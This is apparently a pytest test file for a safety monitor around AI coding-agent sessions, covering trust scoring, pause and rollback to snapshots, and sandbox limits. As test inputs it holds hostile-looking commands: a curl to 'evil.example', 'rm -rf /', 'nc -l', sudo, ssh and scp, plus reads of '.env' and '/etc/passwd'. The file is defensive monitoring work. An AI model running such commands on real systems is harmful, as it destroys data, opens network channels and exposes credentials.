"""The safety watch around a session: snapshot, trust score, sandbox limits.

Driven the way ``agents.session`` drives it (a call, then its result), on a
real task worktree, with tool names from several providers.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from agent_snapshots import list_snapshots
from agents.safety_events import call_events, event_path
from agents.safety_watch import REPORT_FILE, SafetyWatch
from agents.session_guards import SessionGuards
from foundation.pause_state import read_pause_state
from security.agent_safety_settings import ENV_VAR, parse_settings

from .conftest import TASK


def _settings(**sections):
    return parse_settings(sections)


def _run(watch: SafetyWatch, name: str, args: dict, *, is_error=False, call_id="c"):
    watch.call(name, args, call_id)
    return watch.result("ok", is_error, call_id)


# -- events ---------------------------------------------------------------------


def test_tool_calls_of_every_provider_become_events(tmp_path: Path):
    project = tmp_path
    assert call_events("Read", {"file_path": str(project / "src/a.py")}, project) == [
        ("file_read", {"path": "src/a.py"})
    ]
    assert call_events("write_file", {"path": "src/b.py"}, project)[0] == (
        "file_write",
        {"path": "src/b.py"},
    )
    assert call_events("mcp__fs__edit", {"path": "x.py"}, project)[0][0] == "file_write"
    events = call_events("run_command", {"command": "rm -f a.txt b.txt && ls"}, project)
    assert ("file_delete", {"path": "a.txt"}) in events
    assert ("file_delete", {"path": "b.txt"}) in events
    events = call_events("Bash", {"command": "curl https://evil.example/x"}, project)
    assert ("network_request", {"url": "https://evil.example"}) in events
    assert call_events("Write", {"file_path": ".workpilot-allowlist"}, project)[1] == (
        "config_change",
        {"path": ".workpilot-allowlist"},
    )


def test_paths_inside_the_project_are_relative_and_resolved(tmp_path: Path):
    assert event_path("src/../README.md", tmp_path) == "README.md"
    outside = event_path("../../etc/passwd", tmp_path)
    # Absolute, forward slashes on every system (``C:/…`` on Windows).
    assert outside == (tmp_path / "../../etc/passwd").resolve().as_posix()


# -- snapshot and score ----------------------------------------------------------


def test_a_session_in_a_task_worktree_starts_with_a_snapshot(task_project):
    _project, worktree, spec_dir = task_project
    watch = SafetyWatch(spec_dir, "coding", settings=_settings())
    assert watch.snapshot_id is not None
    assert [s.snapshot_id for s in list_snapshots(worktree, TASK)] == [
        watch.snapshot_id
    ]


def test_no_snapshot_when_turned_off_or_outside_a_worktree(task_project, tmp_path):
    _project, _worktree, spec_dir = task_project
    off = _settings(snapshots={"enabled": False})
    assert SafetyWatch(spec_dir, "coding", settings=off).snapshot_id is None
    plain = tmp_path / "p" / ".workpilot" / "specs" / "001"
    plain.mkdir(parents=True)
    assert SafetyWatch(plain, "coding", settings=_settings()).snapshot_id is None


def test_ordinary_work_keeps_the_full_score(task_project):
    _project, _worktree, spec_dir = task_project
    watch = SafetyWatch(spec_dir, "coding", settings=_settings())
    for i, (name, args) in enumerate(
        [
            ("Read", {"file_path": "src/app.py"}),
            ("Read", {"file_path": ".env.example"}),
            ("Bash", {"command": "npm exec -- vitest run && rsync -a src/ out/"}),
            ("Bash", {"command": "curl http://localhost:3000/health"}),
            ("Edit", {"file_path": "src/app.py", "new_string": "x"}),
        ]
    ):
        assert _run(watch, name, args, call_id=str(i)) is False
    watch.close()
    assert not watch.tripped
    report = json.loads((spec_dir / REPORT_FILE).read_text(encoding="utf-8"))
    assert report["sessions"][-1]["trustScore"] == 100.0
    assert report["sessions"][-1]["outcome"] == "completed"


def test_falling_below_the_pause_threshold_pauses_the_task(task_project):
    _project, worktree, spec_dir = task_project
    watch = SafetyWatch(spec_dir, "coding", settings=_settings())
    (worktree / "src" / "app.py").write_text("print('mid-session')\n", encoding="utf-8")
    _run(watch, "Bash", {"command": "sudo ls"}, call_id="1")  # -20
    _run(watch, "Read", {"file_path": ".env"}, call_id="2")  # -20
    tripped = _run(watch, "Bash", {"command": "scp a b:"}, call_id="3")  # -20 -> 40
    assert tripped and watch.tripped and not watch.stop
    state = read_pause_state(spec_dir)
    assert state["enabled"] and state["reason"] == "anomaly"
    assert state["anomaly"]["trustScore"] == 40.0
    assert state["anomaly"]["stopped"] is False
    watch.close()
    # Paused, not stopped: the work stays as it is.
    assert "mid-session" in (worktree / "src" / "app.py").read_text(encoding="utf-8")


def test_falling_below_the_stop_threshold_restores_the_snapshot(task_project):
    _project, worktree, spec_dir = task_project
    watch = SafetyWatch(
        spec_dir, "coding", settings=_settings(anomaly={"pauseBelow": 20})
    )
    (worktree / "src" / "app.py").write_text("print('bad')\n", encoding="utf-8")
    for i, command in enumerate(["sudo x", "ssh h", "nc -l 1", "rm -rf /"]):
        _run(watch, "Bash", {"command": command}, call_id=str(i))
    assert watch.tripped and watch.stop
    watch.close()
    assert (worktree / "src" / "app.py").read_text(encoding="utf-8") == "print('v1')\n"
    state = read_pause_state(spec_dir)
    assert state["anomaly"]["rolledBack"] is True
    assert state["anomaly"]["safetySnapshotId"]


def test_auto_rollback_can_be_turned_off(task_project):
    _project, worktree, spec_dir = task_project
    settings = _settings(snapshots={"autoRollback": False}, anomaly={"pauseBelow": 20})
    watch = SafetyWatch(spec_dir, "coding", settings=settings)
    (worktree / "src" / "app.py").write_text("print('bad')\n", encoding="utf-8")
    for i, command in enumerate(["sudo x", "ssh h", "nc -l 1", "rm -rf /"]):
        _run(watch, "Bash", {"command": command}, call_id=str(i))
    watch.close()
    assert "bad" in (worktree / "src" / "app.py").read_text(encoding="utf-8")


def test_the_watch_can_be_turned_off(task_project):
    _project, _worktree, spec_dir = task_project
    watch = SafetyWatch(
        spec_dir, "coding", settings=_settings(anomaly={"enabled": False})
    )
    for i in range(6):
        assert _run(watch, "Bash", {"command": "sudo x"}, call_id=str(i)) is False


# -- sandbox limits, for the CLI agents' own tools ---------------------------------


def test_a_cli_write_outside_the_restricted_paths_stops_and_restores(task_project):
    _project, worktree, spec_dir = task_project
    settings = _settings(sandbox={"mode": "restricted", "allowedPaths": ["src"]})
    watch = SafetyWatch(spec_dir, "coding", settings=settings)
    (worktree / "README.md").write_text("# rewritten\n", encoding="utf-8")
    assert _run(watch, "edit", {"path": "README.md", "newText": "x"}) is True
    watch.close()
    state = read_pause_state(spec_dir)
    assert state["reason"] == "sandbox"
    assert state["sandbox"]["kind"] == "restricted_path"
    assert (worktree / "README.md").read_text(encoding="utf-8") == "# demo\n"


def test_a_refused_write_is_not_a_violation(task_project):
    _project, _worktree, spec_dir = task_project
    settings = _settings(sandbox={"mode": "restricted", "allowedPaths": ["src"]})
    watch = SafetyWatch(spec_dir, "coding", settings=settings)
    # The hook refused it: nothing was written.
    assert _run(watch, "Write", {"file_path": "README.md"}, is_error=True) is False


def test_too_many_files_written_pauses_without_rollback(task_project):
    _project, worktree, spec_dir = task_project
    watch = SafetyWatch(
        spec_dir, "coding", settings=_settings(sandbox={"maxFilesWritten": 2})
    )
    for i in range(3):
        (worktree / "src" / f"f{i}.py").write_text("x\n", encoding="utf-8")
        tripped = _run(watch, "write_file", {"path": f"src/f{i}.py"}, call_id=str(i))
    assert tripped and not watch.stop
    assert read_pause_state(spec_dir)["sandbox"]["kind"] == "files_written"


def test_a_file_over_the_size_limit_stops_the_session(task_project):
    _project, worktree, spec_dir = task_project
    watch = SafetyWatch(
        spec_dir, "coding", settings=_settings(sandbox={"maxFileSizeMb": 0.00001})
    )
    (worktree / "src" / "big.bin").write_bytes(b"x" * 100)
    assert (
        _run(watch, "Read", {"file_path": "src/big.bin"}) is False
    )  # reading is not writing
    assert _run(watch, "create_file", {"path": "src/big.bin"}, call_id="2") is True
    assert watch.stop


def test_a_session_over_its_time_limit_is_paused(task_project):
    _project, _worktree, spec_dir = task_project
    now = [0.0]
    watch = SafetyWatch(
        spec_dir,
        "validation",
        settings=_settings(sandbox={"maxSessionMinutes": 1}),
        clock=lambda: now[0],
    )
    assert _run(watch, "Read", {"file_path": "README.md"}) is False
    now[0] = 61.0
    watch.call("Read", {"file_path": "README.md"}, "2")
    assert watch.tripped
    state = read_pause_state(spec_dir)
    assert state["sandbox"]["kind"] == "session_time"
    assert state["paused_phase"] == "qa_review"


# -- one object for the session ----------------------------------------------------


def test_session_guards_combine_the_breaker_and_the_watch(task_project, monkeypatch):
    _project, _worktree, spec_dir = task_project
    monkeypatch.setenv(ENV_VAR, json.dumps({"anomaly": {"pauseBelow": 90}}))
    guards = SessionGuards(spec_dir, "coding")
    guards.call("Bash", {"command": "sudo whoami"}, "1")
    assert guards.result("root", False, "1") is True
    assert guards.tripped
    guards.close()


def test_a_broken_watch_leaves_the_breaker_working(task_project, monkeypatch):
    _project, _worktree, spec_dir = task_project

    def boom(*_a, **_k):
        raise OSError("disk gone")

    monkeypatch.setattr("agents.session_guards.SafetyWatch", boom)
    guards = SessionGuards(spec_dir, "coding")
    assert guards.safety is None
    for i in range(5):
        guards.call("Read", {"file_path": "a"}, str(i))
        tripped = guards.result("same", False, str(i))
    assert tripped and guards.tripped
    guards.close()


@pytest.mark.parametrize(
    "phase,stored", [("planning", "planning"), ("other", "coding")]
)
def test_the_pause_names_the_phase(task_project, phase, stored):
    _project, _worktree, spec_dir = task_project
    watch = SafetyWatch(spec_dir, phase, settings=_settings(anomaly={"pauseBelow": 90}))
    _run(watch, "Bash", {"command": "sudo x"})
    assert read_pause_state(spec_dir)["paused_phase"] == stored
